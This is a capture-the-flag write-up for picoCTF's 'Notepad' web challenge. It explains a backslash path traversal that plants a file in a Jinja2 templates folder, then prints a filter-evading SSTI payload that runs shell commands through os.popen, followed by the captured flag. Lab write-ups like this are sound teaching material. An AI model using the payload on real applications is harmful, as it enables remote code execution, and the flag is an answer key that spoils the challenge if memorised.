# Notepad — PicoCTF

**Category:** Web Exploitation  
**Difficulty:** Hard  

---

## overview

the web app has an input to make a note.

---

## source code analysis

looking at `app.py` we found:

```
1. if the note contains '_' or '/' it shows the bad_content page
2. if the length of the note is more than 512, it shows the long_content page
3. if successful, it stores our note in a file in static/
```

in the code i also saw:

```python
name = f"static/{url_fix(content[:128])}-{token_urlsafe(8)}.html"
```

which takes the first 128 characters of content and "fixes" them to be URL-safe (removes spaces, special characters, etc.) and then generates a file name using it + an 8 character long token + `.html`

from the dockerfile we can see that the flag is stored in the same directory as `app.py` with a random name generated using:

```bash
flag-$(cat /proc/sys/kernel/random/uuid).txt
```

---

## recon

putting something like `test 123`, it redirects to a url like `/static/test 123-F056H9F4eqU.h` and says not found — this is because `url_fix` is changing the space to `%20` and saving it as that but using firefox, sending `%20` in the url decodes it to space

i also found something in the `/?error=` parameter — putting something like `/?error=../index` shows `error: ../index` so why does `/?error=bad_content` show `bad_content.html` page?

this is because of the line in the dockerfile:

```dockerfile
chmod 1773 templates/errors
```

the "Others" permission is `3 = Write + Execute, NO Read` — so to go to `../index.html` it first needs to list the files in `/templates/errors` on which it has no listing permission

also even when we try to put server side templates in our html files, it would not execute as the files are stored in `static/` dir. templates only execute in the templates dir

---

## path traversal to SSTI

when i try to put `..\` as content its saying internal server error on the main site. but when launched in my machine using docker, its actually traversing the directory.

doing `..\templates\errors\test` we can actually write files to the `templates\errors` dir

so we can put `..\templates\errors\test` in content followed by 128+ random characters (to avoid writing it in the url which may cause errors) and then our template like `{{7*7}}` to actually execute it

i tried it on my localhost container and it worked!!

and doing it in the main picoctf CTF webapp also worked when we wrote our file to `/templates/errors`. maybe cuz of permission issues it wasnt writing to `/app` dir

---

## exploitation

the send payload through content → copy file path → use error param to access it flow was very lengthy so i made a python script to automate it

searched for jinja2 file read payloads without `_` and `/` as they were blocked and found one that worked:

```python
{{request['application']['\x5f\x5fglobals\x5f\x5f']['\x5f\x5fbuiltins\x5f\x5f']['\x5f\x5fimport\x5f\x5f']('os')['popen']('id')['read']()}}
```

executing `ls -la` using the payload we saw the flag file name:

```
flag-c8f5526c-4122-4578-96de-d7dd27193798.txt
```

then executing `cat flag-c8f5526c-4122-4578-96de-d7dd27193798.txt` using the same payload we got the flag:

```
picoCTF{styl1ng_susp1c10usly_s1m1l4r_t0_p4steb1n}
```

---
